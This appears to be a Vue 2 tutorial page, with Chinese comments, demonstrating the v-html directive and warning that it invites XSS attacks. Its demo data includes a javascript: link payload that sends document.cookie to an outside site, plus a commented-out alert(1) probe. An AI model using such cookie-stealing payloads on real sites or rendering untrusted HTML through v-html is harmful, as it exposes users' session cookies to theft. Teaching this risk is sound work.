<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <title>v-html指令</title>
    <!-- 引入vue -->
    <script type="text/javascript" src="../js/vue.js"></script>
</head>

<body>
    <!-- 
        我们学过的指令：
        1、v-bind： 单向绑定解析表达式，可简写为:xxx
        2、v-model：双向数据绑定
        3、v-for：  遍历数组/对象/字符串
        4、v-on：   绑定事件监听，可简写为@
        5、v-if：   条件渲染（动态控制节点是否存在）
        6、v-else： 条件渲染（动态控制节点是否存在）
        7、v-show： 条件渲染（动态控制节点是否展示）

        8、v-text：
            （1）作用：向其所在的节点中渲染文本内容
            （2）与插值语法的区别：v-text会替换掉节点中的内容，{{xx}}则不会
        
        9、v-html：
            （1）作用：向指定节点中渲染包含html结构的内容
            （2）与插值语法的区别：
                a.v-html会替换掉节点中所有的内容，{{xx}}则不会
                b.v-html可以识别html结构
            （3）严重注意：v-html有安全问题！！
                a.在网站上动态渲染任意HTML是非常危险的，容易导致XSS攻击
                b.一定要在可信的内容上使用v-html，永不要用在用户提交的内容上！
     -->
    <!--准备好一个容器-->
    <div id="root">
        <div>你好，{{name}}</div>
        <div v-html="str"></div>
        <div v-html="str2"></div>
    </div>

    <script type="text/javascript">
        Vue.config.productionTip = false
        
        const vm = new Vue({
            el:'#root', 
            data:{
                name:'清华',
                str:'<h3>你好啊！</h3>',
                // str2:'<a href=javascript:alert(1)>有资源，快来！</a>',
                //可以再浏览器生成a=1和b=2的cookie，点击下面网址会在浏览器地址看到已经获取了a=1和b=2
                str2:'<a href=javascript:location.href="http://www.baidu.com?"+document.cookie>偏你cookie的网站！</a>',
            },
        })
    </script>
</body>

</html>
